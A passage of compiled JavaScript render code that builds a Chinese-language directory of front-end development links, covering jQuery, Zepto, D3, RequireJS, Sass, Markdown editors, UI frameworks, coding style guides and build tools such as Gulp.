地址")]),t("p",[t("a",{attrs:{href:"https://github.com/jtyjty99999/mobileTech",target:"_blank"}},[n._v("99移动端知识集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/Mars",target:"_blank"}},[n._v("移动端前端开发知识库")])]),t("p",[t("a",{attrs:{href:"http://caibaojian.com/mobile-web-bug.html",target:"_blank"}},[n._v("移动前端的一些坑和解决方法（外观表现）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/PeunZhang/p/3407453.html",target:"_blank"}},[n._v("【原】移动web资源整理")])]),t("p",[t("a",{attrs:{href:"http://mweb.baidu.com/zeptoapi",target:"_blank"}},[n._v("zepto 1.0 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.html-5.cn/Manual/Zepto",target:"_blank"}},[n._v("zepto 1.0 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/doc/zeptojs_api",target:"_blank"}},[n._v("zepto 1.1.2")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/sky000/archive/2013/03/29/2988952.html",target:"_blank"}},[n._v("zepto 中文注释")])]),t("p",[t("a",{attrs:{href:"http://app-framework-software.intel.com/api.php",target:"_blank"}},[n._v("jqmobile 手册")])]),t("p",[t("a",{attrs:{href:"https://github.com/maxzhang/maxzhang.github.com/issues",target:"_blank"}},[n._v("移动浏览器开发集合")])]),t("p",[t("a",{attrs:{href:"https://github.com/hoosin/mobile-web-favorites",target:"_blank"}},[n._v("移动开发大杂烩")])]),t("p",[n._v("jQuery")]),t("p",[n._v("jQuery 地址")]),t("p",[t("a",{attrs:{href:"http://www.jquery123.com",target:"_blank"}},[n._v("jQuery API 中文文档")])]),t("p",[t("a",{attrs:{href:"http://hemin.cn/jq",target:"_blank"}},[n._v("hemin 在线版")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/jqapi-1.9/on",target:"_blank"}},[n._v("css88 jq api")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/jquery-ui-api",target:"_blank"}},[n._v("css88 jqui api")])]),t("p",[t("a",{attrs:{href:"http://learn.jquery.com",target:"_blank"}},[n._v("学习jquery")])]),t("p",[t("a",{attrs:{href:"http://james.padolsey.com/jquery",target:"_blank"}},[n._v("jquery 源码查找")])]),t("p",[n._v("D3")]),t("p",[n._v("D3 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/mbostock/d3/wiki/Tutorials",target:"_blank"}},[n._v("d3 Tutorials")])]),t("p",[t("a",{attrs:{href:"https://github.com/mbostock/d3/wiki/Gallery",target:"_blank"}},[n._v("Gallery")])]),t("p",[t("a",{attrs:{href:"http://datavisual.lofter.com/post/40cf3a_188e535",target:"_blank"}},[n._v("lofter")])]),t("p",[t("a",{attrs:{href:"http://alanland.iteye.com/blog/1878595",target:"_blank"}},[n._v("iteye")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/library/d3.html",target:"_blank"}},[n._v("ruanyifeng")])]),t("p",[n._v("Requriejs")]),t("p",[n._v("Requriejs 地址")]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/10/javascript_module.html",target:"_blank"}},[n._v("Javascript模块化编程（一）：模块的写法")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html",target:"_blank"}},[n._v("Javascript模块化编程（二）：AMD规范")])]),t("p",[t("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2012/11/require_js.html",target:"_blank"}},[n._v("Javascript模块化编程（三）：require.js的用法")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/05/22/2513652.html",target:"_blank"}},[n._v("RequireJS入门（一）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/05/23/2513712.html",target:"_blank"}},[n._v("RequireJS入门（二）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/snandy/archive/2012/06/08/2538001.html",target:"_blank"}},[n._v("RequireJS进阶（三）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3632580.html",target:"_blank"}},[n._v("requrie源码学习")])]),t("p",[t("a",{attrs:{href:"http://www.oschina.net/translate/getting-started-with-the-requirejs-library",target:"_blank"}},[n._v("requrie\n                    入门指南")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3214926.html",target:"_blank"}},[n._v("requrieJS 学习笔记")])]),t("p",[t("a",{attrs:{href:"http://cyj.me/why-seajs/requirejs/",target:"_blank"}},[n._v("requriejs 其一")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/yexiaochai/p/3221081.html",target:"_blank"}},[n._v("require backbone结合")])]),t("p",[n._v("Seajs")]),t("p",[n._v("Seajs 地址")]),t("p",[t("a",{attrs:{href:"http://seajs.org",target:"_blank"}},[n._v("seajs")])]),t("p",[t("a",{attrs:{href:"http://cyj.me/why-seajs/zh",target:"_blank"}},[n._v("seajs 中文手册")])]),t("p",[n._v("Less,sass")]),t("p",[n._v("Less,sass 地址")]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/sassguide",target:"_blank"}},[n._v("sass")])]),t("p",[t("a",{attrs:{href:"http://www.sass.hk",target:"_blank"}},[n._v("sass教程-sass中国")])]),t("p",[t("a",{attrs:{href:"http://sass.bootcss.com",target:"_blank"}},[n._v("Sass 中文文档")])]),t("p",[t("a",{attrs:{href:"http://less.bootcss.com",target:"_blank"}},[n._v("less")])]),t("p",[n._v("Markdown")]),t("p",[n._v("Markdown 地址")]),t("p",[t("a",{attrs:{href:"http://wowubuntu.com/markdown",target:"_blank"}},[n._v("Markdown 语法说明 (简体中文版")])]),t("p",[t("a",{attrs:{href:"https://github.com/LearnShare/Learning-Markdown/blob/master/README.md",target:"_blank"}},[n._v("markdown入门参考")])]),t("p",[t("a",{attrs:{href:"https://www.gitbook.com",target:"_blank"}},[n._v("gitbook")])]),t("p",[t("a",{attrs:{href:"https://www.zybuluo.com/mdeditor",target:"_blank"}},[n._v("mdeditor")])]),t("p",[t("a",{attrs:{href:"https://stackedit.io",target:"_blank"}},[n._v("stackedit")])]),t("p",[t("a",{attrs:{href:"http://bh-lay.github.io/mditor",target:"_blank"}},[n._v("mditor")])]),t("p",[t("a",{attrs:{href:"https://github.com/lepture/editor",target:"_blank"}},[n._v("lepture-editor")])]),t("p",[t("a",{attrs:{href:"https://github.com/jbt/markdown-editor",target:"_blank"}},[n._v("markdown-editor")])]),t("p",[t("a",{attrs:{href:"https://www.zybuluo.com",target:"_blank"}},[n._v("作业部落")])]),t("p",[n._v("兼容性")]),t("p",[n._v("兼容性 地址")]),t("p",[t("a",{attrs:{href:"http://kangax.github.io/compat-table/es6",target:"_blank"}},[n._v("esma 兼容列表")])]),t("p",[t("a",{attrs:{href:"http://jigsaw.w3.org/css-validator/validator.html.zh-cn",target:"_blank"}},[n._v("W3C CSS验证服务")])]),t("p",[t("a",{attrs:{href:"http://caniuse.com/#index",target:"_blank"}},[n._v("caniuse")])]),t("p",[t("a",{attrs:{href:"http://csscreator.com/properties",target:"_blank"}},[n._v("csscreator")])]),t("p",[t("a",{attrs:{href:"https://msdn.microsoft.com/zh-cn/library/cc351024",target:"_blank"}},[n._v("microsoft")])]),t("p",[t("a",{attrs:{href:"http://www.responsinator.com",target:"_blank"}},[n._v("在线测兼容-移动端")])]),t("p",[t("a",{attrs:{href:"https://www.manymo.com/emulators",target:"_blank"}},[n._v("emulators")])]),t("p",[n._v("UI相关")]),t("p",[n._v("UI相关 地址")]),t("p",[t("a",{attrs:{href:"http://v3.bootcss.com",target:"_blank"}},[n._v("bootcss")])]),t("p",[t("a",{attrs:{href:"http://www.w3cplus.com/MetroUICSS",target:"_blank"}},[n._v("MetroUICSS")])]),t("p",[t("a",{attrs:{href:"http://semantic-ui.com",target:"_blank"}},[n._v("semantic")])]),t("p",[t("a",{attrs:{href:"http://alexwolfe.github.io/Buttons",target:"_blank"}},[n._v("Buttons")])]),t("p",[t("a",{attrs:{href:"http://hiloki.github.io/kitecss",target:"_blank"}},[n._v("kitecss")])]),t("p",[t("a",{attrs:{href:"http://www.pintuer.com",target:"_blank"}},[n._v("pintuer")])]),t("p",[t("a",{attrs:{href:"http://amazeui.org",target:"_blank"}},[n._v("amazeui")])]),t("p",[t("a",{attrs:{href:"http://www.worldhello.net/gotgithub/index.html",target:"_blank"}},[n._v("worldhello")])]),t("p",[t("a",{attrs:{href:"http://igit.linuxtoy.org/contents.html",target:"_blank"}},[n._v("linuxtoy")])]),t("p",[t("a",{attrs:{href:"http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn",target:"_blank"}},[n._v("gitmagic")])]),t("p",[t("a",{attrs:{href:"http://rogerdudler.github.io/git-guide/index.zh.html",target:"_blank"}},[n._v("rogerdudler")])]),t("p",[t("a",{attrs:{href:"http://gitref.justjavac.com",target:"_blank"}},[n._v("gitref")])]),t("p",[t("a",{attrs:{href:"http://git-scm.com/book/zh",target:"_blank"}},[n._v("book")])]),t("p",[t("a",{attrs:{href:"http://gogojimmy.net/2012/01/17/how-to-use-git-1-git-basic",target:"_blank"}},[n._v("gogojimmy")])]),t("p",[n._v("其它API")]),t("p",[n._v("其它API 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/bookmark/1230000002521721",target:"_blank"}},[n._v("HTTP API 设计指南")])]),t("p",[n._v("javascript流行库汇总 javascriptoo")]),t("p",[t("a",{attrs:{href:"http://niceue.com/validator/demo/index.php",target:"_blank"}},[n._v("验证api")])]),t("p",[t("a",{attrs:{href:"http://www.css88.com/doc/underscore",target:"_blank"}},[n._v("underscore 中文手册")])]),t("p",[t("a",{attrs:{href:"http://www.html-js.com/article/Underscorejs-source-code-analysis-of-underscorejs-source-code-analysis%203031",target:"_blank"}},[n._v("underscore源码分析")])]),t("p",[t("a",{attrs:{href:"http://yalishizhude.github.io/tags/underscore",target:"_blank"}},[n._v("underscore源码分析-亚里士朱德的博客")])]),t("p",[t("a",{attrs:{href:"http://underscorejs.org",target:"_blank"}},[n._v("underscrejs en api")])]),t("p",[t("a",{attrs:{href:"https://lodash.com",target:"_blank"}},[n._v("lodash - underscore的代替品")])]),t("p",[t("a",{attrs:{href:"http://extjs-doc-cn.github.io/ext4api",target:"_blank"}},[n._v("ext4api")])]),t("p",[t("a",{attrs:{href:"http://www.csser.com/tools/backbone/backbone.js.html",target:"_blank"}},[n._v("backbone 中文手册")])]),t("p",[t("a",{attrs:{href:"http://dev.qwrap.com/resource/js/_docs/_youa/#/qw/base/loadJs_.htm",target:"_blank"}},[n._v("qwrap手册")])]),t("p",[t("a",{attrs:{href:"http://easings.net/zh-cn",target:"_blank"}},[n._v("缓动函数")])]),t("p",[t("a",{attrs:{href:"http://www.w3school.com.cn/svg/svg_reference.asp",target:"_blank"}},[n._v("svg 中文参考")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/en-US/docs/Web/SVG",target:"_blank"}},[n._v("svg mdn参考")])]),t("p",[t("a",{attrs:{href:"https://github.com/gabelerner/canvg",target:"_blank"}},[n._v("svg 导出 canvas")])]),t("p",[t("a",{attrs:{href:"https://github.com/exupero/saveSvgAsPng",target:"_blank"}},[n._v("svg 导出 png")])]),t("p",[t("a",{attrs:{href:"http://www.zamzar.com/convert/ai-to-svg",target:"_blank"}},[n._v("ai-to-svg")])]),t("p",[t("a",{attrs:{href:"https://github.com/machao/localStorage",target:"_blank"}},[n._v("localStorage 库")])]),t("p",[n._v("图表类")]),t("p",[n._v("图表类 地址")]),t("p",[t("a",{attrs:{href:"http://www.hcharts.cn/api/index.php",target:"_blank"}},[n._v("Highcharts 中文API")])]),t("p",[t("a",{attrs:{href:"http://api.highcharts.com/highcharts",target:"_blank"}},[n._v("Highcharts 英文API")])]),t("p",[t("a",{attrs:{href:"http://echarts.baidu.com/",target:"_blank"}},[n._v("ECharts 百度的图表软件")])]),t("p",[t("a",{attrs:{href:"http://lbs.amap.com/api",target:"_blank"}},[n._v("高德地图")])]),t("p",[t("a",{attrs:{href:"http://paperjs.org",target:"_blank"}},[n._v("开源的矢量图脚本框架")])]),t("p",[t("a",{attrs:{href:"http://jvectormap.com",target:"_blank"}},[n._v("svg 地图")])]),t("p",[n._v("正则")]),t("p",[n._v("正则 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000002471140",target:"_blank"}},[n._v("JS正则表达式元字符")])]),t("p",[t("a",{attrs:{href:"http://deerchao.net/tutorials/regex/regex.htm",target:"_blank"}},[n._v("正则表达式30分钟入门教程")])]),t("p",[t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions",target:"_blank"}},[n._v("MDN-正则表达式")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/stdlib/regexp.html",target:"_blank"}},[n._v("ruanyifeng - RegExp对象")])]),t("p",[t("a",{attrs:{href:"http://div.io/topic/764?page=1",target:"_blank"}},[n._v("小胡子哥 - 进阶正则表达式")])]),t("p",[t("a",{attrs:{href:"https://github.com/Cedriking/is.js/blob/master/is.js",target:"_blank"}},[n._v("is.js")])]),t("p",[t("a",{attrs:{href:"http://regexper.com",target:"_blank"}},[n._v("正则在线测试")])]),t("p",[n._v("前端")]),t("p",[n._v("前端 地址")]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io/CodeGuide",target:"_blank"}},[n._v("通过分析github代码库总结出来的工程师代码书写习惯")])]),t("p",[t("a",{attrs:{href:"http://codeguide.bootcss.com",target:"_blank"}},[n._v("HTML&CSS编码规范 by @mdo")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2011/10/css-on-team-naming/",target:"_blank"}},[n._v("团队合作的css命名规范-腾讯AlloyTeam前端团队")])]),t("p",[t("a",{attrs:{href:"http://yuwenhui.github.io",target:"_blank"}},[n._v("前端编码规范之js - by yuwenhui")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/hustskyking/p/javascript-spec.html",target:"_blank"}},[n._v("前端编码规范之js - by 李靖")])]),t("p",[t("a",{attrs:{href:"http://zhibimo.com/read/Ashu/front-end-style-guide",target:"_blank"}},[n._v("前端开发规范手册")])]),t("p",[t("a",{attrs:{href:"https://github.com/yuche/javascript#table-of-contents",target:"_blank"}},[n._v("Airbnb JavaScript\n                    编码规范（简体中文版）")])]),t("p",[t("a",{attrs:{href:"http://www.zhihu.com/question/20351507",target:"_blank"}},[n._v("AMD与CMD规范的区别")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/tugenhua0707/p/3507957.html",target:"_blank"}},[n._v("AMD与CMD规范的区别")])]),t("p",[t("a",{attrs:{href:"http://docs.kissyui.com/1.4/docs/html/tutorials/style-guide/kissy-source-style.html",target:"_blank"}},[n._v("KISSY 源码规范")])]),t("p",[t("a",{attrs:{href:"http://codeguide.bootcss.com",target:"_blank"}},[n._v("bt编码规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/Suxiaogang/Code_Guide",target:"_blank"}},[n._v("规范加强版")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/79075",target:"_blank"}},[n._v("前端代码规范 及 最佳实践")])]),t("p",[t("a",{attrs:{href:"http://coderlmn.github.io/code-standards",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"http://isobar-idev.github.io/code-standards",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"http://zhuanlan.zhihu.com/fuyun/19884834",target:"_blank"}},[n._v("百度前端规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/gf-rd/es6-coding-style",target:"_blank"}},[n._v("ECMAScript6 编码规范--广发证券前端团队")])]),t("p",[t("a",{attrs:{href:"http://blog.jobbole.com/79484",target:"_blank"}},[n._v("JavaScript 风格指南/编码规范（Airbnb公司版）")])]),t("p",[t("a",{attrs:{href:"http://nec.netease.com/standard",target:"_blank"}},[n._v("网易前端开发规范")])]),t("p",[t("a",{attrs:{href:"http://www.75team.com/archives/1049",target:"_blank"}},[n._v("css模块")])]),t("p",[t("a",{attrs:{href:"https://github.com/ecomfe/spec",target:"_blank"}},[n._v("前端规范资源列表")])]),t("p",[n._v("PHP")]),t("p",[n._v("PHP 地址")]),t("p",[t("a",{attrs:{href:"http://segmentfault.com/a/1190000000443795",target:"_blank"}},[n._v("最流行的PHP 代码规范")])]),t("p",[t("a",{attrs:{href:"https://github.com/hfcorriez/fig-standards/blob/zh_CN/%E6%8E%A5%E5%8F%97/PSR-2-coding-style-guide.md",target:"_blank"}},[n._v("最流行的PHP 代码规范")])]),t("p",[n._v("各大公司开源项目")]),t("p",[n._v("各大公司开源项目 地址")]),t("p",[t("a",{attrs:{href:"https://code.facebook.com/projects/web",target:"_blank"}},[n._v("Facebook Projects")])]),t("p",[t("a",{attrs:{href:"http://fex.baidu.com",target:"_blank"}},[n._v("百度web前端研发部")])]),t("p",[t("a",{attrs:{href:"http://efe.baidu.com",target:"_blank"}},[n._v("百度EFE")])]),t("p",[t("a",{attrs:{href:"https://github.com/fex-team",target:"_blank"}},[n._v("百度github")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com",target:"_blank"}},[n._v("alloyteam")])]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io",target:"_blank"}},[n._v("alloyteam-github")])]),t("p",[t("a",{attrs:{href:"https://github.com/AlloyTeam/AlloyGameEngine",target:"_blank"}},[n._v("alloyteam-AlloyGameEngine")])]),t("p",[t("a",{attrs:{href:"http://alloyteam.github.io/AlloyDesigner",target:"_blank"}},[n._v("AlloyDesigner")])]),t("p",[t("a",{attrs:{href:"http://www.alloyteam.com/2015/06/h5-jiao-hu-ye-bian-ji-qi-aeditor-jie-shao",target:"_blank"}},[n._v("H5交互页编辑器AEditor介绍")])]),t("p",[t("a",{attrs:{href:"http://aeditor.alloyteam.com",target:"_blank"}},[n._v("AEditor")])]),t("p",[t("a",{attrs:{href:"http://forum.maka.im/wordpress",target:"_blank"}},[n._v("maka")])]),t("p",[t("a",{attrs:{href:"https://github.com/fenbility/weekly-feed",target:"_blank"}},[n._v("值得订阅的weekly")])]),t("p",[t("a",{attrs:{href:"http://cube.qq.com",target:"_blank"}},[n._v("腾讯html5")])]),t("p",[t("a",{attrs:{href:"http://75team.github.io",target:"_blank"}},[n._v("奇舞团开源项目")])]),t("p",[t("a",{attrs:{href:"http://ued.qunar.com",target:"_blank"}},[n._v("Qunar UED")])]),t("p",[t("a",{attrs:{href:"http://scrat.io",target:"_blank"}},[n._v("Scrat")])]),t("p",[n._v("常用")]),t("p",[n._v("常用 地址")]),t("p",[t("a",{attrs:{href:"http://www.zhangxinxu.com/wordpress/2013/12/iebetter-js-make-ie6-ie8-like-modern-browser-ie9-chrome",target:"_blank"}},[n._v("ieBetter.js-让IE6-IE8拥有IE9+,Chrome等浏览器特性")])]),t("p",[t("a",{attrs:{href:"http://mottie.github.io/Keyboard",target:"_blank"}},[n._v("模拟键盘")])]),t("p",[t("a",{attrs:{href:"https://github.com/hotoo/pinyin",target:"_blank"}},[n._v("拼音")])]),t("p",[t("a",{attrs:{href:"https://github.com/mc-zone/IDValidator",target:"_blank"}},[n._v("中国个人身份证号验证")])]),t("p",[n._v("算法")]),t("p",[n._v("算法 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/Ralph-Wang/algorithm.in.js",target:"_blank"}},[n._v("数据结构与算法 JavaScript 描述. 章节练习")])]),t("p",[t("a",{attrs:{href:"https://github.com/twobin/twobinSort",target:"_blank"}},[n._v("常见排序算法（JS版）")])]),t("p",[t("a",{attrs:{href:"https://github.com/luofei2011/jsAgm/blob/master/js/sort.js",target:"_blank"}},[n._v("经典排序")])]),t("p",[t("a",{attrs:{href:"https://github.com/hechangmin/jssort",target:"_blank"}},[n._v("常见排序算法-js版本")])]),t("p",[t("a",{attrs:{href:"https://github.com/lightningtgc/JavaScript-Algorithms",target:"_blank"}},[n._v("JavaScript 算法与数据结构 精华集")])]),t("p",[t("a",{attrs:{href:"http://www.nowcoder.com/live/courses",target:"_blank"}},[n._v("面试常考算法题精讲")])]),t("p",[n._v("移动端")]),t("p",[n._v("移动端 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/ftlabs/fastclick",target:"_blank"}},[n._v("fastclick")])]),t("p",[t("a",{attrs:{href:"https://github.com/mmastrac/jquery-noclickdelay",target:"_blank"}},[n._v("no-click-delay")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/lcw/p/3619181.html",target:"_blank"}},[n._v("【敏捷开发】Android团队开发规范")])]),t("p",[t("a",{attrs:{href:"http://www.jianshu.com/p/4390f4fe19b3",target:"_blank"}},[n._v("Android 开发规范与应用")])]),t("p",[t("a",{attrs:{href:"https://github.com/ychow/ionic-guide",target:"_blank"}},[n._v("ionic")])]),t("p",[n._v("JSON")]),t("p",[n._v("JSON 地址")]),t("p",[t("a",{attrs:{href:"http://beta.json-generator.com",target:"_blank"}},[n._v("模拟生成JSON数据")])]),t("p",[t("a",{attrs:{href:"http://jsonp.afeld.me",target:"_blank"}},[n._v("返回跨域JSONAPI")])]),t("p",[n._v("焦点图")]),t("p",[n._v("焦点图 地址")]),t("p",[t("a",{attrs:{href:"https://github.com/koen301/myfocus",target:"_blank"}},[n._v("myfocus")])]),t("p",[t("a",{attrs:{href:"http://www.chhua.com/myfocus",target:"_blank"}},[n._v("myfocus-官方演示站")])]),t("p",[t("a",{attrs:{href:"http://www.superslide2.com",target:"_blank"}},[n._v("SuperSlidev2.1 -- 大话主席")])]),t("p",[t("a",{attrs:{href:"http://www.bujichong.com/sojs/soChange/index.html",target:"_blank"}},[n._v("soChange")])]),t("p",[n._v("Ext, EasyUI, J-UI 及其它各种UI方案")]),t("p",[n._v("Ext, EasyUI, J-UI 及其它各种UI方案 地址")]),t("p",[t("a",{attrs:{href:"https://www.sencha.com/products/extjs",target:"_blank"}},[n._v("extjs")])]),t("p",[t("a",{attrs:{href:"http://docs.sencha.com/extjs/4.0.7",target:"_blank"}},[n._v("ext4英文api")])]),t("p",[t("a",{attrs:{href:"http://extjs-doc-cn.github.io/ext4api",target:"_blank"}},[n._v("ext4中文api")])]),t("p",[t("a",{attrs:{href:"http://jquery-easyui.googlecode.com/svn/trunk/src",target:"_blank"}},[n._v("jquery easyui 未压缩源代码")])]),t("p",[t("a",{attrs:{href:"http://jui.org",target:"_blank"}},[n._v("J-UI")])]),t("p",[t("a",{attrs:{href:"http://dcloudio.github.io/mui",target:"_blank"}},[n._v("MUI-最接近原生APP体验的高性能前端框架")])]),t("p",[n._v("Amaze UI 中国首个开源 HTML5 跨屏前端框架")]),t("p",[t("a",{attrs:{href:"http://m.sui.taobao.org",target:"_blank"}},[n._v("淘宝 HTML5 前端框架")])]),t("p",[t("a",{attrs:{href:"http://docs.kissyui.com",target:"_blank"}},[n._v("KISSY - 阿里前端JavaScript库")])]),t("p",[t("a",{attrs:{href:"http://nej.netease.com",target:"_blank"}},[n._v("网易Nej - Nice Easy Javascript")])]),t("p",[t("a",{attrs:{href:"http://demos.telerik.com/kendo-ui/mvvm/index",target:"_blank"}},[n._v("Kendo UI MVVM Demo")])]),t("p",[t("a",{attrs:{href:"http://www.bootcss.com",target:"_blank"}},[n._v("Bootstrap")])]),t("p",[t("a",{attrs:{href:"http://smartui.chinamzz.com",target:"_blank"}},[n._v("Smart UI")])]),t("p",[t("a",{attrs:{href:"http://developer.yahoo.com/yui/grids",target:"_blank"}},[n._v("雅虎UI - CSS UI")])]),t("p",[n._v("页面 社会化 分享功能")]),t("p",[n._v("页面 社会化 分享功能 地址")]),t("p",[t("a",{attrs:{href:"http://share.baidu.com",target:"_blank"}},[n._v("百度分享")])]),t("p",[t("a",{attrs:{href:"http://jiathis.com",target:"_blank"}},[n._v("JiaThis")])]),t("p",[t("a",{attrs:{href:"http://developer.baidu.com/soc/share",target:"_blank"}},[n._v("社会化分享组件")])]),t("p",[t("a",{attrs:{href:"http://www.mob.com/#/index",target:"_blank"}},[n._v("ShareSDK 轻松实现社会化功能")])]),t("p",[t("a",{attrs:{href:"http://dev.umeng.com/social/android/quick-integration",target:"_blank"}},[n._v("友盟分享")])]),t("p",[n._v("富文本编辑器")]),t("p",[n._v("富文本编辑器 地址")]),t("p",[t("a",{attrs:{href:"https://www.tinymce.com",target:"_blank"}},[n._v("功能齐全 tinymce")])]),t("p",[t("a",{attrs:{href:"http://ueditor.baidu.com/website",target:"_blank"}},[n._v("百度 ueditor")])]),t("p",[t("a",{attrs:{href:"http://ckeditor.com",target:"_blank"}},[n._v("经典的ckeditor")])]),t("p",[t("a",{attrs:{href:"http://kindeditor.net",target:"_blank"}},[n._v("经典的kindeditor")])]),t("p",[t("a",{attrs:{href:"http://www.bootcss.com/p/bootstrap-wysiwyg",target:"_blank"}},[n._v("wysiwyg")])]),t("p",[t("a",{attrs:{href:"http://integ.github.io/BachEditor",target:"_blank"}},[n._v("一个有情怀的编辑器。Bach's Editor")])]),t("p",[t("a",{attrs:{href:"https://github.com/mycolorway/simditor",target:"_blank"}},[n._v("tower用的编辑器")])]),t("p",[t("a",{attrs:{href:"https://github.com/summernote/summernote",target:"_blank"}},[n._v("summernote 编辑器")])]),t("p",[t("a",{attrs:{href:"http://neilj.github.io/Squire",target:"_blank"}},[n._v("html5编辑器")])]),t("p",[t("a",{attrs:{href:"http://lab.hustlzp.com/XEditor",target:"_blank"}},[n._v("XEditor")])]),t("p",[t("a",{attrs:{href:"https://github.com/wangfupeng1988/wangEditor",target:"_blank"}},[n._v("wangEditor")])]),t("p",[n._v("前端概述")]),t("p",[n._v("前端概述 地址")]),t("p",[t("a",{attrs:{href:"http://www.awesomes.cn",target:"_blank"}},[n._v("前端工具大全")])]),t("p",[t("a",{attrs:{href:"https://github.com/fouber/blog/issues/10?from=timeline&isappinstalled=0#",target:"_blank"}},[n._v("什么是前端工程化")])]),t("p",[n._v("Gulp")]),t("p",[n._v("Gulp 地址")]),t("p",[t("a",{attrs:{href:"http://gulpjs.com",target:"_blank"}},[n._v("Gulp官网")])]),t("p",[t("a",{attrs:{href:"http://www.gulpjs.com.cn",target:"_blank"}},[n._v("Gulp中文网")])]),t("p",[t("a",{attrs:{href:"https://github.com/Platform-CUF/use-gulp",target:"_blank"}},[n._v("gulp资料收集")])]),t("p",[t("a",{attrs:{href:"http://javascript.ruanyifeng.com/tool/gulp.html",target:"_blank"}},[n._v("Gulp：任务自动管理工具 - ruanyifeng")])]),t("p",[t("a",{attrs:{href:"http://gulpjs.com/plugins",target:"_blank"}},[n._v("Gulp插件")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2015/11/25/2015-11-25-toss-gulp/",target:"_blank"}},[n._v("Gulp探究折腾之路(I)")])]),t("p",[t("a",{attrs:{href:"http://www.jeffjade.com/2016/01/19/2016-01-19-toss-gulp/",target:"_blank"}},[n._v("Gulp折腾之路(II)")])]),t("p",[t("a",{attrs:{href:"http://www.ido321.com/1622.html",target:"_blank"}},[n._v("Gulp不完全入门教程")])]),t("p",[t("a",{attrs:{href:"https://github.com/hjzheng/CUF_meeting_knowledge_share/issues/33",target:"_blank"}},[n._v("为什么使用gulp?")])]),t("p",[t("a",{attrs:{href:"http://www.dbpoo.com/getting-started-with-gulp",target:"_blank"}},[n._v("Gulp安装及配合组件构建前端开发一体化")])]),t("p",[t("a",{attrs:{href:"https://github.com/nimojs/gulp-book",target:"_blank"}},[n._v("Gulp 入门指南")])]),t("p",[t("a",{attrs:{href:"https://github.com/nimojs/blog/issues/19",target:"_blank"}},[n._v("Gulp 入门指南 - nimojs")])]),t("p",[t("a",{attrs:{href:"http://www.imooc.com/video/5692",target:"_blank"}},[n._v("Gulp in Action")])]),t("p",[t("a",{attrs:{href:"http://www.w3ctech.com/topic/134",target:"_blank"}},[n._v("Gulp开发教程（翻译）")])]),t("p",[t("a",{attrs:{href:"http://www.cnblogs.com/2050/p/4198792.html",target:"_blank"}},[n._v("前端构建工具gulpjs的使用介绍及技巧")])]),t("p",[n._v("Grunt")]),t("p",[n._v("Grunt 地址")]),t("p",[t("a",{attrs:{href:"http://gruntjs.com",target:"_blank"}},[n._v("gruntjs")])]),t("p",[t("a",{attrs:{href:"http://www.gruntjs.net",target:"_blank"}},[n._v("Grunt中文网")])]),t("p",[n._v("Fis")]),t("p",[n._v("Fis 地址")]),t("p",[t("a",{attrs:{href:"http://fex-team.github.io/fis-site/index.html",target:"_blank"}},[n._v("fis 官网")])]),t("p",[t("a",{attrs:{href:"http://fis.baidu.com",target:"_blank"}},[n._v("fis")])]),t("p",[n._v("pc图轮")]),t("p",[n._v("pc图轮 地址")]),t("p",[t("a",{attrs:{href:"http://www.jsfoot.com/jquery/demo/2011-09-20/192.html",target:"_blank"}},[n._v("单屏轮播sochange")])]),t("p",[t("a",{attrs:{href:"http://bxslider.com/examples/carousel-demystified",target:"_blank"}},[n._v("左右按钮多图切换")])]),t("p",[t("a",{attrs:{href:"https://github.com/alvarotrigo/fullPage.js",target:"_blank"}},[n._v("fullpage全屏轮播")])]),t("p",[n._v("移动端图轮")]),t("p",[n._v("移动端图轮 